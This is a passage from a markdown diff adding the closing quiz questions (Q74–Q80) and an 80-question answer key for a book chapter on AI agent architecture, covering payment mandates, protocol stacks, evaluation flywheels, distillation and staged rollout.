+* **B.** Before going offline, the user cryptographically signs an **AP2 `IntentMandate`** (a W3C Verifiable Credential specifying `authorized_agent`, `max_amount: $600`, `route`, and `expiry`) using their device passkey. At 3:00 AM, the agent signs a **`CartMandate`** linked to that `IntentMandate`; the payment rail cryptographically verifies the signature chain and constraint bounds (`$540 <= $600`) before issuing a single-use payment token.
+* **C.** By emailing the airline to ask for a free ticket.
+* **D.** By disabling fraud checks on all agent transactions.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> **AP2 `IntentMandate` + `CartMandate` cryptographic chains** prove exact user authorization bounds without ever exposing raw payment credentials (`PAN`/`CVV`) to the LLM.
+
+---
+
+### Question 75 (Advanced): The Complete 4-Protocol Enterprise Agent Stack
+Match all four open agent protocols in an enterprise architecture to their respective **architectural planes**:
+1. **Northbound Plane (Agent $\leftrightarrow$ Frontend UI & Human Canvas)**
+2. **East–West Plane (Agent $\leftrightarrow$ Remote Peer/Vendor Agent)**
+3. **Southbound Plane (Agent $\leftrightarrow$ Deterministic Tools, DBs & Resources)**
+4. **Commerce & Trust Plane (User $\leftrightarrow$ Agent $\leftrightarrow$ Payment Rails)**
+
+* **A.** 1 = MCP, 2 = AG-UI, 3 = AP2, 4 = A2A.
+* **B.** **1 = AG-UI & A2UI** (Northbound UX & state sync); **2 = A2A** (East–West multi-agent task delegation); **3 = MCP** (Southbound tools, resources & sampling); **4 = AP2 / A2P** (Cryptographic payment mandates & settlement).
+* **C.** All four planes use raw SMTP email.
+* **D.** 1 = SQL, 2 = HTML, 3 = CSS, 4 = FTP.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> **AG-UI/A2UI (Northbound)**, **A2A (East–West)**, **MCP (Southbound)**, and **AP2 (Commerce)** form a complete, non-overlapping four-plane protocol stack for modern enterprise agents.
+
+---
+
+## Part 15: The Agent Quality Flywheel & Distillation (Q76–Q80)
+
+### Question 76 (Beginner): Mining Implicit Production Signals for the Quality Flywheel
+Fewer than $1\%$ of enterprise users click explicit "Thumbs Up / Thumbs Down" feedback buttons in an agent UI. Which three **implicit production telemetry signals** should your **Agent Quality Flywheel** automatically mine from OpenTelemetry traces to identify failing interactions for your evaluation suite?
+
+* **A.** Font size, screen brightness, and mouse color.
+* **B.** (1) **User Rephrase / Retry within 30s** (indicating dissatisfaction with the prior answer), (2) **High HITL Edit Distance** (human reviewers heavily modifying the agent's proposed draft/tool args before approving), and (3) **Trajectory Anomalies** (runs where `step_count > P95`, `ToolExecutionError` retries $>2$, or handoff cycle breakers tripped).
+* **C.** Only traces where the server CPU temperature exceeded 80°C.
+* **D.** Randomly selecting 1 trace per year.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Implicit behavioral signals (user retries, HITL edits) and system trace anomalies (excessive steps, tool errors) provide $50\times$ more failure coverage than explicit thumbs-down clicks.
+
+---
+
+### Question 77 (Intermediate): Step-Level Fault Attribution Waterfall in Multi-Agent Chains
+A 4-stage support pipeline (`IntentRouter -> HybridRetriever -> SQLAnalyst -> CommsWriter`) produces an inaccurate customer response. When you inspect the OpenTelemetry trace checkpoints in forward order:
+* `IntentRouter` correctly classified `intents = ["INFRA", "BILLING"]`.
+* `HybridRetriever` returned 0 chunks mentioning the new `Enterprise-Plus` SLA tier because that PDF was never indexed (`Recall@8 = 0`).
+* `SQLAnalyst` queried the right table.
+* `CommsWriter` guessed the SLA threshold since no chunk was present.
+
+Where does **Step-Level Fault Attribution** assign the root-cause blame, and what is the correct fix?
+
+* **A.** Blame `CommsWriter` and spend 2 weeks rewriting its tone prompt.
+* **B.** **Retrieval / Knowledge Fault at Stage 2 (`HybridRetriever`):** Because the first upstream failure occurred when `HybridRetriever` returned `Recall@8 = 0` for `Enterprise-Plus`, downstream synthesis could not succeed. Fix the indexing pipeline AND add a **Corrective RAG (CRAG) / abstention gate** so the agent never guesses when retrieval returns 0 relevant policy chunks.
+* **C.** Blame `IntentRouter` and delete the billing branch.
+* **D.** Replace all 4 agents with a single prompt.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Forward waterfall attribution pins blame on the **earliest upstream node** whose output violated its post-condition, preventing teams from wasting time tweaking downstream prompts when upstream retrieval failed.
+
+---
+
+### Question 78 (Intermediate): Programmatic Skill & Prompt Evolution (`TextGrad` / `BootstrapFewShot`)
+Your team uses a **Meta-Optimizer LLM (`TextGrad` pattern)** to inspect 15 failed evaluation traces and propose an automated update to `incident-rca/SKILL.md`. Under what exact condition should your CI/CD pipeline accept and merge the optimizer's proposed `SKILL.md` diff?
+
+* **A.** Merge it immediately if the Meta-Optimizer claims its diff is "much better."
+* **B.** **Strict Hill-Climbing Regression Gate:** Accept the candidate `SKILL.md` diff *if and only if* running the full 4-Tier Golden Evaluation Suite shows (1) a measurable improvement on the targeted failure slice, (2) **zero regressions** on existing Tier-1/2/3/4 passing cases, and (3) no degradation in `pass^3` consistency or CpO budget!
+* **C.** Merge it if the file size is smaller.
+* **D.** Only test it on the 15 failed cases and ignore the rest of the benchmark suite.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Testing only on the 15 failed cases leads to overfitting that breaks previously working cases; gating candidate diffs against the **full stratified regression suite** guarantees monotonic quality improvement.
+
+---
+
+### Question 79 (Advanced): Trajectory Distillation & Natural DPO Preference Pairs from Self-Healing Loops
+You launched a complex SQL & log-debugging agent using a heavyweight **Frontier Teacher Model** (e.g., Gemini Pro). Over 30 days, it logged 15,000 verified successful trajectories. In 3,000 of those runs, the Teacher made a tool schema/SQL error on **Attempt 1**, received a `ToolExecutionError` observation, and emitted the fixed, working tool call on **Attempt 2**. How can you use those 3,000 self-healed traces to distill a **$10\times$ cheaper, $3\times$ faster Flash Student Model** that doesn't even make the Attempt 1 mistake?
+
+* **A.** Train the Student model to always fail on Attempt 1 and succeed on Attempt 2 so it imitates the Teacher's mistake.
+* **B.** (1) Use the 12,000 clean 1st-try trajectories for **Rejection-Sampled Supervised Fine-Tuning (SFT)**, and (2) convert the 3,000 self-healed traces into **Direct Preference Optimization (DPO) pairs** at the initial context state—setting **Attempt 2's working tool call as Chosen ($y_{\text{win}}$)** and **Attempt 1's failed tool call as Rejected ($y_{\text{lose}}$)**—teaching the Student model to emit the right tool call on Turn 1!
+* **C.** Delete all 15,000 logs and train on random Wikipedia text.
+* **D.** Distillation only works for image classification, not tool-calling agents.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Self-healed agent traces (`Attempt 1 failed -> Attempt 2 succeeded`) are a goldmine for **Direct Preference Optimization (DPO)** because they provide exact counterfactual `(Chosen, Rejected)` action pairs conditioned on identical prompt context!
+
+---
+
+### Question 80 (Advanced): Rolling Out Distilled Models via Dark Shadowing & Confidence Cascades
+After distilling your **Flash Student Model**, how should you roll it out to production to capture $80\%+$ cost & latency savings while guaranteeing zero customer-visible quality drops on novel edge cases?
+
+* **A.** Delete the Frontier Teacher model immediately and send 100% of traffic to the Student model with no fallback.
+* **B.** **Stage 1 (Dark Shadow Validation):** Run the Student model asynchronously in shadow mode on live read-only traffic to verify trajectory agreement with the Teacher. **Stage 2 (Confidence-Gated Hybrid Cascade):** Promote the fast Student model to handle primary traffic, but automatically **escalate to the Frontier Teacher Model** whenever router confidence is low ($<0.80$) or if the Student hits a `ToolExecutionError` on Turn 1.
+* **C.** Run both the Teacher and Student sequentially on 100% of traffic forever.
+* **D.** Disable all monitoring once the Student model is deployed.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> **Shadow validation** followed by a **Confidence/Error-Triggered Teacher Cascade** delivers the speed and cost of the distilled Student model on $85\%\text{–}90\%$ of traffic while retaining the Frontier Teacher model as an automatic safety net for hard tail cases.
+
+---
+
+## Master 80-Question Answer Key
+
+| Q# | Topic Tested | Ans | Q# | Topic Tested | Ans |
+| :-: | :--- | :-: | :-: | :--- | :-: |
+| **Q1** | Workflows vs. Agents (Golden Rule) | **B** | **Q41** | Eager vs. Lazy-Loaded MCP Tool Schemas | **B** |
+| **Q2** | Compound Reliability ($r^N$) & $O(K^2)$ Token Law | **B** | **Q42** | MCP Transports (`stdio`/`HTTP`) & `Sampling` | **B** |
+| **Q3** | The 4-Tier Agentic Memory Taxonomy | **B** | **Q43** | MCP Security: Poisoning, Rug Pulls & OAuth 2.1 | **B** |
+| **Q4** | ReAct Error-as-Observation Self-Healing | **B** | **Q44** | Combining MCP (Vertical) with A2A (Horizontal) | **B** |
+| **Q5** | Plan-and-Execute vs. ReAct Myopia & Bloat | **B** | **Q45** | The 3 Pillars of Agent Evaluation & CpO | **B** |
+| **Q6** | Grounded Reflexion vs. Ungrounded Flip-Flop | **B** | **Q46** | Trajectory Match Modes (`IN_ORDER_MATCH`) | **B** |
+| **Q7** | The 4 Multi-Agent Splitting Triggers | **B** | **Q47** | `pass@k` vs. `pass^k` Production Consistency | **B** |
+| **Q8** | Sequential Chaining & Deterministic Code Gates | **B** | **Q48** | Hermetic Tool Sandboxes & User Simulators | **B** |
+| **Q9** | Parallel Fan-Out Fault Isolation (`gather`) | **B** | **Q49** | Artifact Pointers & Durable HITL Checkpointing | **B** |
+| **Q10** | Identifying Hidden Runtime Data Dependencies | **C** | **Q50** | Framework Idioms: Google ADK, LangGraph, CrewAI | **A** |
+| **Q11** | Multi-Intent Router Schema & Cost Tiering | **B** | **Q51** | Context Layout: Primacy, Recency & Lost-in-Middle | **B** |
+| **Q12** | Parallel State Reducers (`operator.add`) | **B** | **Q52** | Protecting Prefix KV-Cache from Dynamic Timestamps | **B** |
+| **Q13** | Orchestrator–Workers + Semaphore Bounds | **B** | **Q53** | Observation Masking & Watermark Compaction | **B** |
+| **Q14** | Evaluator–Optimizer Context & Tool Isolation | **A** | **Q54** | OS Virtual Memory (`MemGPT` Core vs. Archival) | **B** |
+| **Q15** | Preventing Critic Nitpicking (`blocking_defects`) | **B** | **Q55** | Bi-Temporal Knowledge Graphs (`valid_from`/`to`) | **B** |
+| **Q16** | Supervisor: `AgentTool` vs. Peer Handoffs | **A** | **Q56** | Indirect Prompt Injection & "Lethal Trifecta" | **B** |
+| **Q17** | Solving the "Telephone Game" in Hierarchies | **B** | **Q57** | Markdown Image Exfiltration & CSP `img-src` | **B** |
+| **Q18** | Composing Hybrid Orchestration Topologies | **B** | **Q58** | Dual-LLM Privilege Separation (`CaMeL`) & Taint | **B** |
+| **Q19** | Supervisor vs. Swarm Per-Turn Latency | **B** | **Q59** | OAuth 2.1 On-Behalf-Of (`sub`+`act`) & DB RLS | **B** |
+| **Q20** | Swarm Cycle Detection (`visited_edges`) | **B** | **Q60** | Sandbox Isolation: gVisor & Firecracker MicroVMs | **B** |
+| **Q21** | Blackboard Decoupling & Trigger Deduplication | **B** | **Q61** | Cost per Validated Outcome (CpO) & Thinking Cost | **B** |
+| **Q22** | Multi-Agent Debate: Blind Round 1 & Early Exit | **B** | **Q62** | Latency Bottlenecks: `TTFT`, `TPOT` & `TCT` | **B** |
+| **Q23** | Selecting Swarm vs. Blackboard vs. Debate | **A** | **Q63** | The 6 High-Leverage Tokenomics Levers | **B** |
+| **Q24** | Tool Calling Execution Boundary (Brain vs. Hands) | **B** | **Q64** | Root `TokenBudgetEnforcer` Circuit Breakers | **B** |
+| **Q25** | Parallel vs. Sequential Tool Calling Turns | **B** | **Q65** | Capacity Sizing: PTU/GSU + PAYGO + Batch APIs | **B** |
+| **Q26** | ACI Design vs. Thin REST Wrappers | **B** | **Q66** | Native Multimodal Live Streaming vs. Cascaded | **B** |
+| **Q27** | Dynamic Semantic Tool Retrieval (Tool-RAG) | **B** | **Q67** | Computer-Use & Set-of-Mark (SoM) Grounding | **B** |
+| **Q28** | `CodeAct` Sandboxes vs. JSON Tool Loops | **B** | **Q68** | Post-Action Visual Verification in GUI Loops | **B** |
+| **Q29** | Least-Privilege Auth, Idempotency & Sagas | **B** | **Q69** | Full-Duplex Barge-In Buffer Flush & Truncation | **B** |
+| **Q30** | Why Naive Single-Pass Vector RAG Fails | **A** | **Q70** | Non-Blocking Async Tools & $pHash$ Frame Gating | **B** |
+| **Q31** | Corrective RAG (CRAG) Relevance Grading | **B** | **Q71** | The 3 Tiers of Generative UI (`A2UI` vs. `iframe`) | **B** |
+| **Q32** | Self-RAG (`[IsSup]` & `[IsUse]`) Checks | **B** | **Q72** | AG-UI Streaming Lifecycle & Tool-Arg Events | **B** |
+| **Q33** | GraphRAG vs. Vector RAG for Multi-Hop Topology | **B** | **Q73** | AG-UI `STATE_DELTA` (JSON Patch) + `A2UI` Binding | **B** |
+| **Q34** | Multi-Agent Federated RAG Architecture | **B** | **Q74** | AP2 / A2P Cryptographic `IntentMandate` & `CartMandate` | **B** |
+| **Q35** | Agent Skills (`SKILL.md`) vs. Tools vs. RAG | **B** | **Q75** | The 4-Protocol Stack (`AG-UI`, `A2A`, `MCP`, `AP2`) | **B** |
+| **Q36** | 3-Tier Progressive Disclosure Token Math | **B** | **Q76** | Mining Implicit Signals for the Quality Flywheel | **B** |
+| **Q37** | Tuning Skill Frontmatter (`Use when` / `Don't`) | **B** | **Q77** | Step-Level Fault Attribution Waterfall | **B** |
+| **Q38** | Deterministic Offloading via Skill `scripts/` | **B** | **Q78** | Automated Skill Evolution (`TextGrad`) & Gates | **B** |
+| **Q39** | Router Skills, `skill_search` & Ablation Evals | **B** | **Q79** | Trajectory Distillation & Self-Healed DPO Pairs | **B** |
+| **Q40** | MCP Primitives: `Tools`, `Resources`, `Prompts` | **B** | **Q80** | Shadow Deployment & Confidence Teacher Cascades | **B** |
+
+---
+
+[⬅️ Previous: Chapter 17 — Production State, HITL & Framework Survey](./chapter-17-production-state-hitl-and-frameworks.md) | [📚 Book Index](./README.md)
